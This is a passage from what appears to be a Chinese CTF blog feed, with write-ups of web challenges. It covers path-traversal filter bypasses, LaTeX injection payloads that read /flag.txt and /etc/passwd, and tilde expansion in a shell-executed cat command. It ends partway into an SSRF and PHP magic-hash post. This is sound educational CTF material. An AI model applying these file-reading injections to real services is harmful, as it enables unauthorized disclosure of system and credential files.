class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dockerfileÊñá‰ª∂</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM python:3.10-slim-busterRUN pip3 <span class="token function">install</span> flaskCOPY flag.txt /WORKDIR /appCOPY app/* /app/copy app/templates/* /app/templates/copy app/themes/* /app/themes/EXPOSE <span class="token number">5000</span>ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"python3"</span>, <span class="token string">"app.py"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂèØ‰ª•ÂæóÁü•flagÊñá‰ª∂Âêç‰∏∫flag.txtÔºå<code>path = path.replace(&quot;../&quot;, &quot;&quot;)</code>ËøôÈáåÊää<code>../</code>‰πüÁªôËøáÊª§‰∫Ü<br>ÁªïËøáÁöÑËØùÊàëËØï‰∫ÜËØïÂèëÁé∞<code>//flag.txtÂíå..///flag.txt</code>ÈÉΩÂèØ‰ª•ÁªïËøá<br><img src="https://img-blog.csdnimg.cn/0f66898d59574faf8b13befd85b71cee.png" alt="1"></p><h3 id="latek"><a href="#latek" class="headerlink" title="latek"></a>latek</h3><blockquote><p>bryanguoÔºà‰∏éctfÊó†ÂÖ≥Ôºâ‰∏ÄÁõ¥ËØ¥ÂÆÉÁöÑÂèëÈü≥ÊòØlatekÔºåËÄå‰∏çÊòØÂÉèÊâãÂ•óÊùêÊñôÈÇ£Ê†∑ÁöÑ‰π≥ËÉ∂„ÄÇ‰∏çÁÆ°ÊÄéÊ†∑ÔºåÊàëÂà∂‰Ωú‰∫ÜËøô‰∏™ÁÆÄÂçïÁöÑÂ∫îÁî®Á®ãÂ∫èÔºåËøôÊ†∑‰ªñÂ∞±‰∏çÂÜçÊîØ‰ªòËÉåÈ°µÁöÑË¥πÁî®‰∫Ü„ÄÇ<br>Ê≥®ÊÑèÔºöÊ†áÂøó‰ªÖÂú®&#x2F;flag.txt</p></blockquote><p><img src="https://img-blog.csdnimg.cn/3730939722a3412fb00a4fd24179ee9c.png" alt="1"><br>Ëøô‰∏™Â∞±ÊòØ‰∏Ä‰∏™Âú®Á∫øÁöÑLaTexÁºñËæëÂô®ÔºåÂ∞ÜÁºñËæëÁöÑÂÜÖÂÆπ‰ª•pdfÁöÑÊñá‰ª∂ÂΩ¢ÂºèÂ±ïÁé∞Âá∫Êù•ÔºåÊü•Áúã‰∫Ü‰∏ÄÁØá<a href="https://salmonsec.com/cheatsheets/exploitation/latex_injection">ÂõΩÂ§ñÂ§ß‰Ω¨ÁöÑÂçöÂÆ¢</a>Ôºå‰ªãÁªç‰∫ÜLaTexÊ≥®ÂÖ•ÁöÑ‰∏Ä‰∫õËØ≠Ê≥ï„ÄÇ</p><p>ËæìÂÖ•</p><blockquote><p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\input{&#x2F;flag.txt}<br>\end{document} </p></blockquote><p>‰ºöÂèëÁé∞ÁªôÂá∫‰∫Ü‰∏ÄÈÉ®ÂàÜflag<br><img src="https://img-blog.csdnimg.cn/fbb8040055734064a248c8036fd23c2c.png" alt="1"><br>ÈÇ£‰πàÂè¶‰∏ÄÈÉ®ÂàÜÊÄé‰πàÂæóÂà∞Âë¢ÔºüÂÄüÈâ¥‰∫ÜwpÁúãÂà∞‰ªñ‰ΩøÁî®‰∫ÜÊâπÂ§ÑÁêÜÊ®°Âºè</p><blockquote><p>\batchmodeÔºöÂú® LaTeX ‰∏≠ÔºåËØ•ÂëΩ‰ª§‰ºöÊäëÂà∂ÊâÄÊúâÁªàÁ´ØÂíåÊó•ÂøóÊñá‰ª∂ËæìÂá∫ÔºåËøôÊÑèÂë≥ÁùÄÁºñËØëËøáÁ®ã‰∏ç‰ºöÂú®ÁªàÁ´Ø‰∏ä‰∫ßÁîü‰ªª‰ΩïÊ∂àÊÅØÊàñÊèêÁ§∫„ÄÇÂÆÉÈÄöÂ∏∏Áî®‰∫é‰ª•ÊâπÂ§ÑÁêÜÊ®°ÂºèËøêË°å LaTeXÔºåÂú®Â§ÑÁêÜÊñáÊ°£Êó∂‰∏ç‰ºö‰∏≠Êñ≠Áî®Êà∑ËæìÂÖ•ÊàñÂèçÈ¶à„ÄÇÂΩìÊÇ®ÊÉ≥Ë¶ÅËá™Âä®ÂåñÊñáÊ°£ÁîüÊàêËøáÁ®ãÊó∂ÔºåËøô‰ºöÂæàÊúâÂ∏ÆÂä©</p></blockquote><blockquote><p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\batchmode<br>\input{&#x2F;flag.txt}<br>\end{document} </p></blockquote><blockquote><p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\usepackage{verbatim}<br>\verbatiminput{&#x2F;etc&#x2F;passwd}<br>\end{document} </p></blockquote><blockquote><p>Âú®LaTeXÊñáÊ°£‰∏≠Ôºå\usepackage{verbatim}Áî®‰∫éÂØºÂÖ•Âêç‰∏∫‚Äùverbatim‚ÄùÁöÑÂÆèÂåÖÔºåÂÆÉÊèê‰æõ‰∫ÜÂú®ÊñáÊ°£‰∏≠ÊèíÂÖ•ÂéüÂßãÊñáÊú¨ÔºàverbatimÊñáÊú¨ÔºâÁöÑÂäüËÉΩ„ÄÇÂΩì‰Ω†Â∏åÊúõÂú®ÊñáÊ°£‰∏≠ÂéüÊ†∑ÊòæÁ§∫‰∏ÄÊÆµ‰ª£Á†Å„ÄÅÈÖçÁΩÆÊñá‰ª∂ÊàñÂÖ∂‰ªñ‰ªª‰ΩïÊñáÊú¨Êó∂ÔºåÈÄöÂ∏∏‰ºö‰ΩøÁî®ËØ•ÂÆèÂåÖ„ÄÇ</p></blockquote><p><img src="https://img-blog.csdnimg.cn/af8f210f009944a088f99b6809eb579f.png" alt="1"><br>ÂèÇËÄÉÈìæÊé•<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">ÈìæÊé•</a><br><a href="https://salmonsec.com/cheatsheets/exploitation/latex_injection">ÈìæÊé•</a></p><h3 id="uwuctf"><a href="#uwuctf" class="headerlink" title="uwuctf"></a>uwuctf</h3><blockquote><p>Ëøô‰∏™ rust uwuifier ÈÄüÂ∫¶Â§™Âø´‰∫ÜÔºåÊàëÁ°Æ‰ø°Âè™Ë¶ÅÊàëËÉΩÊ¨∫È™óÊàëÁöÑËäÇÁÇπÔºåÂÆÉÂ∞±‰ºöÊâ©Â±ïÂà∞ÊúàÁêÉ„ÄÇuwuifier Âç≥ÊúçÂä°‰∏ì‰∏öÁâà‰ΩïÊó∂ËÆ¢ÈòÖÔºü<br>Êõ¥Êñ∞Ôºözip Âá†‰πé‰∏éÊúçÂä°Âô®Áõ∏ÂêåÔºåÈô§‰∫ÜÊàë‰ª¨Âà†Èô§‰∫Üchallenge.yml Âíåflag.txt</p></blockquote><p><img src="https://img-blog.csdnimg.cn/ef485e2862cb42e8883d69eae95ea0a5.png" alt="1"><br>ËøôÈáåÂ∞±ÊòØËÆøÈóÆ‰∏äÈù¢ÁöÑÊñá‰ª∂ÂΩìÊàëÂà©Áî®LFIÊºèÊ¥ûÊó∂ÂèëÁé∞<code>../</code>Ë¢´ËøáÊª§‰∫Ü„ÄÇÂêéÁª≠ÊµãËØï‰∫ÜÂæàÂ§öÈÅç‰πüÊ≤°ÊúâÊÄùË∑Ø„ÄÇÊúÄÂêéÁúãËßÅÂà´‰∫∫ÁöÑwpÁªìÂêàÊ∫êÁ†Å<br>ËøôÊòØindex.jsÊñá‰ª∂</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"dotenv"</span><span class="token punctuation">;</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> fs <span class="token keyword">from</span> <span class="token string">"fs"</span><span class="token punctuation">;</span><span class="token keyword">import</span> path <span class="token keyword">from</span> <span class="token string">"path"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>quote<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"shell-quote"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>exec<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"child_process"</span><span class="token punctuation">;</span><span class="token keyword">const</span> textsDir <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"texts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> uwuifierPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"uwuify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">"express"</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> morgan <span class="token keyword">from</span> <span class="token string">"morgan"</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'trust proxy'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'loopback'</span><span class="token punctuation">,</span> <span class="token string">'linklocal'</span><span class="token punctuation">,</span> <span class="token string">'uniquelocal'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">"combined"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">"public/index.html"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">root</span><span class="token operator">:</span> process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// bug fix</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/uwuify"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no hacking >:("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"cat "</span> <span class="token operator">+</span> <span class="token function">quote</span><span class="token punctuation">(</span><span class="token punctuation">[</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" | "</span> <span class="token operator">+</span> uwuifierPath<span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">cwd</span><span class="token operator">:</span> textsDir    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>stdout <span class="token operator">+</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no src provided"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/dir"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> output <span class="token operator">=</span> <span class="token string">"texts avali to uwuify: "</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> files <span class="token operator">=</span> <span class="token keyword">await</span> fs<span class="token punctuation">.</span>promises<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span>textsDir<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> file <span class="token keyword">of</span> files<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        output <span class="token operator">+=</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> file<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    output <span class="token operator">+=</span> <span class="token string">"\r\n\r\nUse /uwuify?src=&lt;text file name> to uwuify a text file!"</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Server Up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÊòØdockerfileÊñá‰ª∂</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM node:16COPY ./* /home/node/app/COPY ./public/* /home/node/app/public/COPY ./public/texts/* /home/node/app/public/texts/WORKDIR /home/node/appRUN <span class="token function">npm</span> <span class="token function">install</span>ENV <span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token number">8082</span>RUN <span class="token function">chown</span> <span class="token parameter variable">-R</span> node:node /home/node/app<span class="token environment constant">USER</span> <span class="token function">node</span>CMD <span class="token punctuation">[</span><span class="token string">"bash"</span>, <span class="token string">"launch.sh"</span><span class="token punctuation">]</span>EXPOSE <span class="token number">8082</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂèØ‰ª•ÁúãÂà∞ÂÆûÈôÖ‰∏äflag.txtÂ∞±Âú®&#x2F;home&#x2F;node&#x2F;app&#x2F;flag.txt<br>ËØªÂèñÂΩìÂâçÁõÆÂΩï‰ΩøÁî®<code>~</code>ÔºåÂÖ∂ÂÆû<code>https://uwuasaservice.amt.rs/uwuify?src=~</code>‰πüÂ∞±ÊòØ<code>cat ~</code>ÔºåËøô‰∏™Êó∂ÂÄôÁàÜÂá∫Ë∑ØÂæÑ</p><blockquote><p>cat: &#x2F;home&#x2F;node: Is a directory</p></blockquote><p>ÈÇ£‰πà‰∏ãÈù¢Â∞±Áõ¥Êé•ËØªÂèñflagÊñá‰ª∂<br><a href="https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt">https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt</a></p><blockquote><p>amateuwsctf{so_wmao_this_fwag_is_gonna_be_a_wot_wongew_than_most_fwag_othew_fwags_good_wuck_have_fun_decoding_it_end_of_fwag}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ê∂âÂèäSSRFÁöÑ‰∏Ä‰∫õtricks</title>
      <link href="/2023/07/20/%E6%B6%89%E5%8F%8ASSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"/>
      <url>/2023/07/20/%E6%B6%89%E5%8F%8ASSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
      
        <content type="html"><![CDATA[<h2 id="trick1"><a href="#trick1" class="headerlink" title="trick1"></a>trick1</h2><blockquote><p>phpÈÅáÂà∞‰∏çËÆ§ËØÜÁöÑÂçèËÆÆÂ∞±‰ºöÂΩìÁõÆÂΩïÂ§ÑÁêÜ</p></blockquote><p>ÂèÇËÄÉÈ¢òÁõÆ<a href="https://ctf.show/challenges#web2_%E6%95%85%E4%BA%BA%E5%BF%83-482">ctfshowÊúàÈ•ºÊùØÊïÖ‰∫∫ÂøÉ</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">7</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">**</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Â∑ÆÁÇπÁÇπÂ∞±ÊàêÂäü‰∫ÜÔºÅ'</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'ÊÉ≥‰∏ÄÊÉ≥md5Á¢∞ÊíûÂéüÁêÜÂêß?!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Á¨¨‰∏Ä‰∏™ÈÉΩËøá‰∏ç‰∫ÜËøòÊÉ≥Ë¶ÅflagÂëÄ?!'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</code><br>aÊòØÊï∞Â≠óÔºåaÁöÑÈïøÂ∫¶Â∞è‰∫é7Ôºåa‰∏çÁ≠â‰∫é0ÔºåaÁöÑÂπ≥ÊñπÊòØ0</p></blockquote><p>Áî±‰∫éÈïøÂ∫¶ÈôêÂà∂ÔºåËøô‰∏™Êó∂ÂÄôÂà©Áî®Âà∞ÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÊâæ‰∏Ä‰∏™ÊØîËæÉÂ∞èÁöÑÊï∞‰æãÂ¶Ç<strong>1e-234</strong></p><blockquote><p><code>$d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</code><br>Êúâ‰∏™robots.txtÊñá‰ª∂</p><p><img src="https://img-blog.csdnimg.cn/e78bc410ddb4452f9a789038554b8fc3.png" alt="1"><br>Âè™Ë¶Å‰øùËØÅ‰∏Ä‰∏™Êï∞ÂâçÈù¢Âä†‰∏ä0e‰πãÂêéÂÜçmd2‰ªçÁÑ∂ÊòØ0eÂºÄÂ§¥ÁöÑÊï∞Â≠óÂç≥ÂèØ</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">999999</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'024452'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'$b = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span 